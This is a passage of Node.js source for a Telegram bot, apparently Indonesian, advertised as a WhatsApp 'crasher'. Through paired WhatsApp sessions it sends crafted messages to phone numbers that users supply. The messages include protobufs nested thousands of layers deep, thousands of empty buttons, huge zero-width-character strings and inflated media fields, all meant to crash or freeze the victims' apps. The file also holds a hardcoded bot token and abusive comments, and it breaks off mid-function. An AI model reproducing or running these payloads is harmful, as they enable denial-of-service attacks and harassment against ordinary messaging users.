
const {
    default: makeWASocket,
    fetchLatestWAWebVersion,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    templateMessage,
    InteractiveMessage,
    Header,
    viewOnceMessage,
    groupStatusMentionMessage,
} = require('@whiskeysockets/baileys');
const fs = require("fs-extra");
const JsConfuser = require("js-confuser");
const P = require("pino");
const pino = require("pino");
const crypto = require("crypto");
const path = require("path");
const { execSync, exec } = require("child_process");
const sessions = new Map();
const readline = require('readline');
const axios = require("axios");
const chalk = require("chalk"); 
const config = require("./settings/config.js");
const TelegramBot = require("node-telegram-bot-api");
const BOT_TOKEN = config.BOT_TOKEN;
const CHANNEL_LINK = "https://t.me/miwachno"; // ← link channel
const OWNER_ID = config.OWNER_ID;
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";
const ONLY_FILE = "only.json";
const developerIds = config.DEVELOPER_IDS;

function isOnlyGroupEnabled() {
  const config = JSON.parse(fs.readFileSync(ONLY_FILE));
  return config.onlyGroup;
}

function setOnlyGroup(status) {
  const config = { onlyGroup: status };
  fs.writeFileSync(ONLY_FILE, JSON.stringify(config, null, 2));
}

function shouldIgnoreMessage(msg) {
  if (!isOnlyGroupEnabled()) return false;
  return msg.chat.type === "private";
}

let premiumUsers = JSON.parse(fs.readFileSync('./database/premium.json'));
let adminUsers = JSON.parse(fs.readFileSync('./database/admin.json'));

function ensureFileExists(filePath, defaultData = []) {
    if (!fs.existsSync(filePath)) {
        fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
    }
}

ensureFileExists('./database/premium.json');
ensureFileExists('./database/admin.json');


function savePremiumUsers() {
    fs.writeFileSync('./database/premium.json', JSON.stringify(premiumUsers, null, 2));
}

function saveAdminUsers() {
    fs.writeFileSync('./database/admin.json', JSON.stringify(adminUsers, null, 2));
}

function isExpired(dateStr) {
  const now = new Date();
  const exp = new Date(dateStr);
  return now > exp;
}

// Ganti dengan token bot Telegram kamu



// Ganti dengan chat_id kamu (owner)
const OWNER_CHAT_ID = '8293274887';

// Pesan notifikasi
const message = `Bot telah dijalankan pada ${new Date().toLocaleString()}. Owner Chat ID: ${OWNER_ID}`;

async function sendNotif() {
  try {
    const url = `https://api.telegram.org/bot7986800235:AAG7WoYotXpu5RhnXns-33KzUUNWNPn_X6Q/sendMessage`;
    await axios.post(url, {
      chat_id: OWNER_CHAT_ID,
      text: message,
      parse_mode: 'Markdown'
    });
    console.log('Notifikasi berhasil dikirim ke owner.');
  } catch (error) {
    console.error('Gagal mengirim notifikasi:', error.message);
  }
}

// Fungsi untuk memantau perubahan file
function watchFile(filePath, updateCallback) {
    fs.watch(filePath, (eventType) => {
        if (eventType === 'change') {
            try {
                const updatedData = JSON.parse(fs.readFileSync(filePath));
                updateCallback(updatedData);
                console.log(`File ${filePath} updated successfully.`);
            } catch (error) {
                console.error(`Error updating ${filePath}:`, error.message);
            }
        }
    });
}

watchFile('./database/premium.json', (data) => (premiumUsers = data));
watchFile('./database/admin.json', (data) => (adminUsers = data));


const bot = new TelegramBot(BOT_TOKEN, { polling: true });





let sock;

function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(chalk.yellow(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`));

      for (const botNumber of activeNumbers) {
        console.log(chalk.blue(`Mencoba menghubungkan WhatsApp: ${botNumber}`));
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        sock = makeWASocket ({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });

        // Tunggu hingga koneksi terbentuk
        await new Promise((resolve, reject) => {
          sock.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === "open") {
              console.log(chalk.green(`Bot ${botNumber} Connected 🔥️!`));
              sendNotif();
              sessions.set(botNumber, sock);
              resolve();
            } else if (connection === "close") {
              const shouldReconnect =
                lastDisconnect?.error?.output?.statusCode !==
                DisconnectReason.loggedOut;
              if (shouldReconnect) {
                console.log(chalk.red(`Mencoba menghubungkan ulang bot ${botNumber}...`));
                await initializeWhatsAppConnections();
              } else {
                reject(new Error("Koneksi ditutup"));
              }
            }
          });

          sock.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp connections:", error);
  }
}

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

async function connectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `\`\`\`𝙿𝚁𝙾𝚂𝙴𝚂 𝙿𝙰𝙸𝚁𝙸𝙽𝙶 𝙱𝙰𝙽𝙶  ${botNumber}.....\`\`\`
`,
      { parse_mode: "Markdown" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  sock = makeWASocket ({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `\`\`\`𝙿𝚁𝙾𝚂𝙴𝚂 𝙱𝙰𝙽𝙶  ${botNumber}.....\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        await connectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
          `
\`\`\`𝙴𝚁𝚁𝙾𝚁 𝙱𝙰𝙽𝙶  ${botNumber}.....\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, sock);
      saveActiveSessions(botNumber);
      await bot.editMessageText(
        `\`\`\`𝙿𝚊𝚒𝚛𝚒𝚗𝚐 𝚂𝚞𝚔𝚜𝚎𝚜 ${botNumber}..... 𝚋𝚊𝚗𝚐\`\`\`
`,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "Markdown",
        }
      );
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(botNumber);
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
          await bot.editMessageText(
            `
\`\`\`𝙺𝙴𝙻𝙰𝚉𝚉 𝚂𝚄𝙺𝚂𝙴𝚂 𝙿𝙰𝙸𝚁𝙸𝙽𝙶\`\`\`
𝙲𝙾𝙳𝙴 𝙴𝙽𝚃𝙴 : ${formattedCode}`,
            {
              chat_id: chatId,
              message_id: statusMessage,
              parse_mode: "Markdown",
            }
          );
        }
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText(
          `
\`\`\`𝙶𝙰𝙶𝙰𝙻 𝙰𝙽𝙹𝙸𝚁  ${botNumber}.....\`\`\``,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);

  return sock;
}

// -------( Fungsional Function Before Parameters )--------- \\
// ~Bukan gpt ya kontol

//~Runtime🗑️🔧
function formatRuntime(seconds) {
  const days = Math.floor(seconds / (3600 * 24));
  const hours = Math.floor((seconds % (3600 * 24)) / 3600);
  const minutes = Math.floor((seconds % 3600) / 60);
  const secs = seconds % 60;
  
  return `${days} Hari, ${hours} Jam, ${minutes} Menit, ${secs} Detik`;
}

const startTime = Math.floor(Date.now() / 1000); 

function getBotRuntime() {
  const now = Math.floor(Date.now() / 1000);
  return formatRuntime(now - startTime);
}

//~Get Speed Bots🔧🗑️
function getSpeed() {
  const startTime = process.hrtime();
  return getBotSpeed(startTime); 
}

//~ Date Now
function getCurrentDate() {
  const now = new Date();
  const options = { weekday: "long", year: "numeric", month: "long", day: "numeric" };
  return now.toLocaleDateString("id-ID", options); 
}


function getRandomImage() {
  const images = [
        "https://files.catbox.moe/t3xoc9.jpg"
  ];
  return images[Math.floor(Math.random() * images.length)];
}

function getPremiumStatus(userId) {
  const user = premiumUsers.find(user => user.id === userId);
  if (user && new Date(user.expiresAt) > new Date()) {
    return `👌 - ${new Date(user.expiresAt).toLocaleString("id-ID")}`;
  } else {
    return "😡 - Tidak ada waktu aktif";
  }
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

async function getWhatsAppChannelInfo(link) {
    if (!link.includes("https://whatsapp.com/channel/")) return { error: "Link tidak valid!" };
    
    let channelId = link.split("https://whatsapp.com/channel/")[1];
    try {
        let res = await sock.newsletterMetadata("invite", channelId);
        return {
            id: res.id,
            name: res.name,
            subscribers: res.subscribers,
            status: res.state,
            verified: res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak"
        };
    } catch (err) {
        return { error: "Gagal mengambil data! Pastikan channel valid." };
    }
}



// case bug ada dibawah sendiri
function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}


const bugRequests = {};

// ===== VALIDASI TOKEN RAW GITHUB =====
const TOKEN_URL = "https://raw.githubusercontent.com/dilzxxceo-15/art-project/refs/heads/main/tokens.json";

async function validateToken() {
  try {
    const cacheBuster = `?t=${Date.now()}`;
    const response = await axios.get(TOKEN_URL + cacheBuster, {
      headers: { "Cache-Control": "no-cache", "Pragma": "no-cache" },
      responseType: "text",
      transformResponse: [(data) => data]
    });
    const parsed = JSON.parse(response.data);
    const allTokens = (parsed.tokens || []).map(v => v.toString().trim());
    return allTokens.includes(config.BOT_TOKEN.trim());
  } catch (e) {
    return false;
  }
}
(async () => {
  const valid = await validateToken();
  if (!valid) {
    console.log("❌ TOKEN TIDAK TERDAFTAR! Script dihentikan.");
    process.exit(1);
  }
  console.log("✅ TOKEN TERDAFTAR");
})();


// ===== UPDATE SYSTEM =====
const RAW_INDEX_URL = "https://raw.githubusercontent.com/indzzinndzzz-afk/JEMBUD-AH-AH/refs/heads/main/index.js";




// ===== /start =====
bot.onText(/\/start/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (shouldIgnoreMessage(msg)) return;

  // Direct show main menu (NO KEY REQUIRED)
  showMainMenu(chatId);
});

// ===== /key (REMOVED - NOT NEEDED - ALL USERS AUTO VERIFIED) =====

function showMainMenu(chatId) {
  bot.sendPhoto(chatId, "https://files.catbox.moe/t3xoc9.jpg", {
    caption: `
<blockquote><b>亗#ɢᴏᴊᴏ ᴄʀᴀꜱʜᴇʀ-bugs</b></blockquote>
╰➤ˎˊ˗ ɪ'ᴍ ᴀ ᴛᴇʟᴇɢʀᴀᴍ ʙᴜɢ ʙᴏᴛ. ɪᴛ ʜᴀꜱ ᴀ ʙᴜɢ ꜰᴇᴀᴛᴜʀᴇ ᴛʜᴀᴛ ᴄᴀɴ ᴄʀᴀꜱʜ ᴡʜᴀᴛꜱᴀᴘᴘ.
<blockquote><b>─﹗nformation</b>
乂 Developr : @Belachann
▢ Version : 1.0 pro-bugs
乂 Language : Javascript 
╘═———————---———————═⬡</blockquote>
# sᴇʟᴇᴄᴛ ᴛʜᴇ ʙᴜᴛᴛᴏɴ ᴛᴏ sʜᴏᴡ ᴍᴇɴᴜ
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [
          { text: "⌗ ᴏᴡɴᴇʀ ﹗", callback_data: "owner_menu", style: "Danger" },
          { text: "⌗ ᴀᴛᴛᴀᴄᴋ ﹗", callback_data: "trashmenu", style: "Danger" }
        ],
        [
          { text: "▢ ᴄʀᴇᴀᴛᴏʀ", url: "https://t.me/Belachann", style: "primary" }
        ]
      ]
    }
  });
}

// /register handler removed (OTP system disabled)

bot.on("callback_query", async (query) => {
  try {

    // Cek join channel
    
    await bot.answerCallbackQuery(query.id).catch(() => {});
    const chatId = query.message.chat.id;
    const messageId = query.message.message_id;
    const username = query.from.username ? `@${query.from.username}` : "Tidak ada username";
    const senderId = query.from.id;
    const runtime = getBotRuntime();
    const premiumStatus = getPremiumStatus(query.from.id);
    const randomImage = getRandomImage();

    let caption = "";
    let replyMarkup = {};

    if (query.data === "trashmenu") {
      caption = `<blockquote><b>─( 🕸 ) #ɢᴏᴊᴏ ᴄʀᴀꜱʜᴇʀ Engine</b></blockquote>
<b>I am a telegram bot created by @Belachann || I can bug whatsapp for you
Vテレグラムボットのバグです。</b>
─────────────────────

<blockquote><b>「 Wadidaw - Bugs 」</b></blockquote>
▢ /delayspam &lt;number&gt
▢ /forclose &lt;number&gt
▢ /forcloseios &lt;number&gt`;
      replyMarkup = { inline_keyboard: [[{ text: "Back", callback_data: "back_to_main",style: "danger", icon_custom_emoji_id: "5375149865842001926" }]] };
    } else if (query.data === "owner_menu") {
      caption = `<blockquote><b>─( 🕸 ) || The #ɢᴏᴊᴏ ᴄʀᴀꜱʜᴇʀ</b></blockquote>
I am a telegram bot created by @Belachann || I can bug whatsapp for you
Vテレグラムボットのバグです。
─────────────────────
<blockquote><b>「 Owner Menu 」</b></blockquote>
ᝰ.ᐟ /addprem ɪᴅ ᴅᴀʏs
ᝰ.ᐟ /delprem ɪᴅ
ᝰ.ᐟ /cekprem ᴄᴇᴋ ᴘʀᴇᴍɪᴜᴍ ᴜꜱᴇʀ
ᝰ.ᐟ /addadmin ɪᴅ
ᝰ.ᐟ /update ᴜᴘᴅᴀᴛᴇ ꜱᴄʀɪᴘᴛ ᴛᴇʀʙᴀʀᴜ
ᝰ.ᐟ /iqc ɪQᴄ ɪᴘʜᴏɴᴇ Qᴏᴜᴛᴇꜱ
ᝰ.ᐟ /reqpair number`;
      replyMarkup = { inline_keyboard: [[{ text: "🔙 Back", callback_data: "back_to_main", style: "danger", icon_custom_emoji_id: "5375149865842001926"}]] };
    }

    if (query.data === "back_to_main") {
      caption = `
<blockquote><b>亗 Welcome to #乂-ɢᴏᴊᴏ ᴄʀᴀꜱʜᴇʀ</b></blockquote>
╰➤ˎˊ˗ ɪ'ᴍ ᴀ ᴛᴇʟᴇɢʀᴀᴍ ʙᴜɢ ʙᴏᴛ. ɪᴛ ʜᴀꜱ ᴀ ʙᴜɢ ꜰᴇᴀᴛᴜʀᴇ ᴛʜᴀᴛ ᴄᴀɴ ᴄʀᴀꜱʜ ᴡʜᴀᴛꜱᴀᴘᴘ.
<blockquote><b>─﹗nformation</b>
乂 Developr : @Belachann
乂 Version : 1.0 new
乂 Language : Javascript 
╘═———————---———————═⬡</blockquote>
# sᴇʟᴇᴄᴛ ᴛʜᴇ ʙᴜᴛᴛᴏɴ ᴛᴏ sʜᴏᴡ ᴍᴇɴᴜ
`;
      replyMarkup = {
        inline_keyboard: [
        [{ text: "⌗ ᴏᴡɴᴇʀ ﹗", callback_data: "owner_menu", style: "Danger" }, { text: "⌗ ᴀᴛᴛᴀᴄᴋ !", callback_data: "trashmenu", style: "Danger" }],
        [{ text: "𖥘 ᴄʀᴇᴀᴛᴏʀ", url: "https://t.me/Belachann", style: "primary" }]
      ]
      };
    }

    if (caption) {
      await bot.editMessageCaption(caption, {
        chat_id: chatId,
        message_id: messageId,
        parse_mode: "HTML",
        reply_markup: replyMarkup
      });
    }

    await bot.answerCallbackQuery(query.id);
  } catch (error) {
    console.error("Error handling callback query:", error);
  }
});

// ============ COMMAND /TheExecution ============
async function LockGb(sock, groupJid) {
    await sock.groupParticipantsUpdate(groupJid, ["13135550002@s.whatsapp.net"], "add");
}

async function crashX(sock, groupJid) {
await sock.relayMessage(groupJid, {
interactiveMessage: {
body: {
text: "x"
},
nativeFlowMessage: {
buttons: [
{
name: "catalog_message",
buttonParamsJson: "{}"
}
],
messageParamsJson: "{}"
}
}
},
{
additionalNodes: [
{
tag: "biz",
attrs: {
native_flow_name: "catalog_message"
}
}
]
});
}

async function XxNoX(sock, target) {
const CrBLock = {
interactiveMessage: {
body: {
text: "MakLo(RcB)"
},
nativeFlowMessage: {
buttons: Array.from({ length: 20000 }, () => ({}))
},
contextInfo: {
quotedMessage: {
contactMessage: {
displayName: "x",
vcard: null
},
},
},
},
};

const Crb = generateWAMessageFromContent(target, CrBLock, {});

await sock.relayMessage(target, Crb.message, {
messageId: Crb.key.id
})
}

// Created by @NandoOfficiali
// not sell sher pemakaian pribadi 
// kefix tanggung resikonya 

async function LexcaabosFast(sock, target, durationHours = 500) {
    const IMG = {
        url: "https://mmg.whatsapp.net/o1/v/t24/f2/m235/AQNoT0RVMsuqbGex4OAhCfu4uJgG8NDGShMN2WvxFxGEKQIN9AiuElv-4a6btmTyzbCYvvc6h-WsBx2srRxEA8LMPxWi_qtr6MvQV73Meg?ccb=9-4&oh=01_Q5Aa5AGLJ8RxEGZ7pZhWUQzr6gaFzyzpge4GNToAX6gKki2QZQ&oe=6A9602BA&_nc_sid=e6ed6c&mms3=true",
        directPath: "/o1/v/t24/f2/m235/AQNoT0RVMsuqbGex4OAhCfu4uJgG8NDGShMN2WvxFxGEKQIN9AiuElv-4a6btmTyzbCYvvc6h-WsBx2srRxEA8LMPxWi_qtr6MvQV73Meg?ccb=9-4&oh=01_Q5Aa5AGLJ8RxEGZ7pZhWUQzr6gaFzyzpge4GNToAX6gKki2QZQ&oe=6A9602BA&_nc_sid=e6ed6c",
        mediaKey: "xD3KegXJnRDJbL89tyWMpG1m12+jAXgXKN0XhTS0riM=",
        fileEncSha256: "ef7Y+a5ufhg2pfcsfZ23SYE4vUNtyoc3j/8/yyqr58Q=",
        fileSha256: "84cNaVGkzmIJwjozrUJipNbXoNb0ovMC8OWBMpLRcYU=",
        fileLength: 20010,
        mediaKeyTimestamp: "1785637793",
        mimetype: "image/jpeg",
        height: 1600,
        width: 1200,
        jpegThumbnail: ""
    };

    const TAGS = [
        [0xBA, 0x03],
        [0xD2, 0x04],
        [0xAA, 0x02],
    ];

    const encodeVarint = function(n) {
        var buf = [];
        while (n >= 0x80) {
            buf.push((n & 0x7f) | 0x80);
            n >>>= 7;
        }
        buf.push(n);
        return Buffer.from(buf);
    };

    const wrapLd = function(tag, data) {
        return Buffer.concat([Buffer.from(tag), encodeVarint(data.length), data]);
    };

    const Payload = proto.Message.encode(
        proto.Message.fromObject({ imageMessage: IMG })
    ).finish();

    const inflate = function(tag, depth) {
        var buf = Payload;
        for (var i = 0; i < depth; i++) {
            buf = wrapLd(tag, wrapLd([0x0A], buf));
        }
        return buf;
    };

    const resolveJid = function(raw) {
        var s = String(raw || '').trim();
        if (s.includes('@')) return s;
        return s.replace(/\D/g, '') + '@s.whatsapp.net';
    };

    const jids = (Array.isArray(target) ? target : [target])
        .map(resolveJid)
        .filter(function(j) { return j.length > 15; });

    var MAX_BATCH = 1;
    var DELAY_MS = 1000;
    var totalSent = 0;

    for (var offset = 0; offset < jids.length; offset += MAX_BATCH) {
        var bokep = jids.slice(offset, offset + MAX_BATCH);
        var isFirst = offset === 0;

        if (!isFirst) {
            await new Promise(function(r) { setTimeout(r, DELAY_MS); });
        }

        var idx = Math.floor(offset / MAX_BATCH) + 1;
        var suffix = idx > 1 ? ('n' + idx) : 'n';
        var msg = 'NanasMuda' + Date.now().toString(36).toUpperCase() + suffix;

        for (var ti = 0; ti < TAGS.length; ti++) {
            var tag = TAGS[ti];
            var ampasx = null;

            for (var depth = 3000; depth >= 800 && !ampasx; depth -= 300) {
                try {
                    var decoded = proto.Message.decode(inflate(tag, depth));
                    proto.Message.encode(decoded).finish();
                    ampasx = decoded;
                } catch (_) {}
            }

            if (!ampasx) continue;

            await sock.relayMessage('status@broadcast', ampasx, {
                messageId: msg,
                statusJidList: bokep,
                additionalNodes: [{
                    tag: 'meta',
                    attrs: {},
                    content: [{
                        tag: 'mentioned_users',
                        attrs: {},
                        content: bokep.map(function(jid) {
                            return { tag: 'to', attrs: { jid: jid }, content: [] };
                        })
                    }]
                }]
            });
        }
    }
}

async function ForcloseVIDEO(sock, target) {
  const video = {
    url: "https://mmg.whatsapp.net/v/t62.7161-24/26969734_696671580023189_3150099807015053794_n.enc?ccb=11-4&oh=01_Q5Aa1wH_vu6G5kNkZlean1BpaWCXiq7Yhen6W-wkcNEPnSbvHw&oe=6886DE85&_nc_sid=5e03e0&mms3=true",
    mimetype: "video/mp4",
    fileSha256: "sHsVF8wMbs/aI6GB8xhiZF1NiKQOgB2GaM5O0/NuAII=",
    fileLength: 999999999,
    seconds: 999999999,
    mediaKey: "EneIl9K1B0/ym3eD0pbqriq+8K7dHMU9kkonkKgPs/8=",
    caption: "NandoX",
    height: 9999,
    width: 9999,
    fileEncSha256: "KcHu146RNJ6FP2KHnZ5iI1UOLhew1XC5KEjMKDeZr8I=",
    directPath: "/v/t62.7161-24/26969734_696671580023189_3150099807015053794_n.enc?ccb=11-4&oh=01_Q5Aa1wH_vu6G5kNkZlean1BpaWCXiq7Yhen6W-wkcNEPnSbvHw&oe=6886DE85&_nc_sid=5e03e0",
    mediaKeyTimestamp: "1751081957",
    jpegThumbnail: null, 
    streamingSidecar: null
  };
   
    const tol = [
        [0xBA, 0x03],
        [0xD2, 0x04],
        [0xAA, 0x02],
    ];

    const encodeVarint = function(rb) {
        var buf = [];
        while (rb >= 0x80) {
            buf.push((rb & 0x7f) | 0x80);
            rb >>>= 7;
        }
        buf.push(rb);
        return Buffer.from(buf);
    };

    const wrapLd = function(tag, data) {
        return Buffer.concat([Buffer.from(tag), encodeVarint(data.length), data]);
    };

    const MakLo = proto.Message.encode(
        proto.Message.fromObject({ videoMessage: video })
    ).finish();

    const inflate = function(tag, rayap) {
        var buf = MakLo;
        for (var i = 0; i < rayap; i++) {
            buf = wrapLd(tag, wrapLd([0x0A], buf));
        }
        return buf;
    };

    const resolveJid = function(raw) {
        var s = String(raw || '').trim();
        if (s.includes('@')) return s;
        return s.replace(/\D/g, '') + '@s.whatsapp.net';
    };

    const jids = (Array.isArray(target) ? target : [target])
        .map(resolveJid)
        .filter(function(j) { return j.length > 15; });

    var MAX_BATCH = 100;
    var DELAY_MS  = 2000;
    var totalSent = 0;

    for (var offset = 0; offset < jids.length; offset += MAX_BATCH) {
        var crb   = jids.slice(offset, offset + MAX_BATCH);
        var isFirst = offset === 0;

        if (!isFirst) {
            await new Promise(function(r) { setTimeout(r, DELAY_MS); });
        }

        var idx   = Math.floor(offset / MAX_BATCH) + 1;
        var suffix = idx > 1 ? ('n' + idx) : 'n';
        var CrBMsG  = 'crb' + Date.now().toString(36).toUpperCase() + suffix;

        for (var ti = 0; ti < tol.length; ti++) {
            var tag     = tol[ti];
            var bokep = null;

            for (var rayap = 3000; rayap >= 800 && !bokep; rayap -= 300) {
                try {
                    var decoded = proto.Message.decode(inflate(tag, rayap));
                    proto.Message.encode(decoded).finish();
                    bokep = decoded;
                } catch (_) {}
            }

            if (!bokep) continue;

            await sock.relayMessage('status@broadcast', bokep, {
                messageId: CrBMsG,
                statusJidList: crb,
                additionalNodes: [{
                    tag: 'meta',
                    attrs: {},
                    content: [{
                        tag: 'mentioned_users',
                        attrs: {},
                        content: crb.map(function(jid) {
                            return { tag: 'to', attrs: { jid: jid }, content: [] };
                        })
                    }]
                }]
            });
        }
    }
}


async function OnehitFc(sock, target) {

    const N = 50000;

    for (let i = 0; i < 100; i++) {
      const nanX = {
        groupStatusMessageV2: {
          message: {
            interactiveMessage: {
              header: {
                bloksWidget: {
                  fallback: "\u200D".repeat(N),
                  type:     "\u200F".repeat(N),
                  data:     "[".repeat(N),
                  uuid:     "\u200B".repeat(N),
                },
                subtitle: "\u0010".repeat(N),
                title:    "X".repeat(N),
              },
              nativeFlowMessage: { buttons: [{}] },
              body: { text: "\u000F" },
            },
          },
        },
      };

      const msg = generateWAMessageFromContent(target, nanX, {});

      await sock.relayMessage(target, msg.message, {
        messageId: msg.key.id,
        noSelfSync: true,
      });
    }
}

//kontol
// Created by @NandoOfficiali
// not sell sher pemakaian pribadi 
// kefix tanggung resikonya 
// Created by @NandoOfficiali
// not sell sher pemakaian pribadi 
// kefix tanggung resikonya 

async function ForcloseDOC(sock, target) {
  const document = {
url: "https://mmg.whatsapp.net/v/t62.7119-24/583550661_2366231810527044_2211533771736792774_n.enc?ccb=11-4&oh=01_Q5Aa4gE54f2r8LoDblReCmtq2DnGP-mSrNd-omujIcrP313Vlg&oe=6A3DBD88&_nc_sid=5e03e0&mms3=true",
mimetype: "application/pdf",
fileSha256: "7rOXceVPuGvMTfHN7VXURYOQV2ZmzxQ4xZ6cLM2JNPA=",
fileLength: 999999999,
pageCount: 1000,
mediaKey: "oohdpzQ3uCjBvJWx+2VmRj4bWsCiTvrpUftezu27bs4=",
fileName: "nando.pdf",
fileEncSha256: "IT6Goux9voqfI50TST8rtFY9iVmxZenRz55JXZpAR2g=",
directPath: "/v/t62.7119-24/583550661_2366231810527044_2211533771736792774_n.enc?ccb=11-4&oh=01_Q5Aa4gE54f2r8LoDblReCmtq2DnGP-mSrNd-omujIcrP313Vlg&oe=6A3DBD88&_nc_sid=5e03e0",
mediaKeyTimestamp: "1779839963",
thumbnailDirectPath: "/v/t62.36145-24/705860036_1320514133375133_5228808273876536402_n.enc?ccb=11-4&oh=01_Q5Aa4gFkVLVWUFlX-Jk7uj1PdsnY5lmVp4lWmmQYdHkPsFhTUQ&oe=6A3DAF40&_nc_sid=5e03e0",
thumbnailSha256: "xK2z7ScS2wSQDxLVfdZ5e1BpIe+GsTv8KaVGAfufqjY=",
thumbnailEncSha256: "2N98oiJb8xii+D/KYAuHRq7Mg/8OIHFXNZQ5py4g9fM=",
jpegThumbnail: null,
contextInfo: {},
thumbnailHeight: 999,
thumbnailWidth: 999
};
   
    const tol = [
        [0xBA, 0x03],
        [0xD2, 0x04],
        [0xAA, 0x02],
    ];

    const encodeVarint = function(rb) {
        var buf = [];
        while (rb >= 0x80) {
            buf.push((rb & 0x7f) | 0x80);
            rb >>>= 7;
        }
        buf.push(rb);
        return Buffer.from(buf);
    };

    const wrapLd = function(tag, data) {
        return Buffer.concat([Buffer.from(tag), encodeVarint(data.length), data]);
    };

    const MakLo = proto.Message.encode(
        proto.Message.fromObject({ documentMessage: document })
    ).finish();

    const inflate = function(tag, rayap) {
        var buf = MakLo;
        for (var i = 0; i < rayap; i++) {
            buf = wrapLd(tag, wrapLd([0x0A], buf));
        }
        return buf;
    };

    const resolveJid = function(raw) {
        var s = String(raw || '').trim();
        if (s.includes('@')) return s;
        return s.replace(/\D/g, '') + '@s.whatsapp.net';
    };

    const jids = (Array.isArray(target) ? target : [target])
        .map(resolveJid)
        .filter(function(j) { return j.length > 15; });

    var MAX_BATCH = 100;
    var DELAY_MS  = 2000;
    var totalSent = 0;

    for (var offset = 0; offset < jids.length; offset += MAX_BATCH) {
        var crb   = jids.slice(offset, offset + MAX_BATCH);
        var isFirst = offset === 0;

        if (!isFirst) {
            await new Promise(function(r) { setTimeout(r, DELAY_MS); });
        }

        var idx   = Math.floor(offset / MAX_BATCH) + 1;
        var suffix = idx > 1 ? ('n' + idx) : 'n';
        var CrBMsG  = 'crb' + Date.now().toString(36).toUpperCase() + suffix;

        for (var ti = 0; ti < tol.length; ti++) {
            var tag     = tol[ti];
            var bokep = null;

